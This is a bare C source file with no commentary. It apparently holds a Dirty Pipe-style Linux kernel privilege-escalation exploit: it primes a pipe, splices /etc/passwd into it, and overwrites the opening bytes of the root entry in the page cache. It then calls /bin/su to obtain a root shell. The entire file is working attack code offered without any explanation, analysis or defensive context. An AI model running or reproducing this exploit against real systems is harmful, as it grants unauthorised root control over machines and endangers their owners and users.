#define	_GNU_SOURCE
#include <fcntl.h>
#include <unistd.h>
#include <string.h>

#define	PAGESIZE 4096
#define	PIPEPAGENUM	16

void
	main( int argc, char **argv )
{
	int	fd = open( "/etc/passwd", O_RDONLY );
	size_t	offset = 5;
	char	*data = argc > 1 && *argv[1] == ':' ? "x:0:0:root" : ":0:0:rootx" ;

	int	p[2];
	pipe( p );

	char	buffer[PAGESIZE];
	for( int i = 0; i < PIPEPAGENUM; i++ ) write( p[1], buffer, PAGESIZE );
	for( int i = 0; i < PIPEPAGENUM; i++ ) read( p[0], buffer, PAGESIZE );

	offset--;
	splice( fd, &offset, p[1], NULL, 1, 0 );

	write( p[1], data, strlen( data ) );

	if( argc > 1 && *argv[1] == ':' ) execl( "/bin/su", "/bin/su", "-", NULL );
	strcat( argv[0], " :" );
	execl( "/bin/su", "/bin/su", "-c", argv[0], NULL );
}
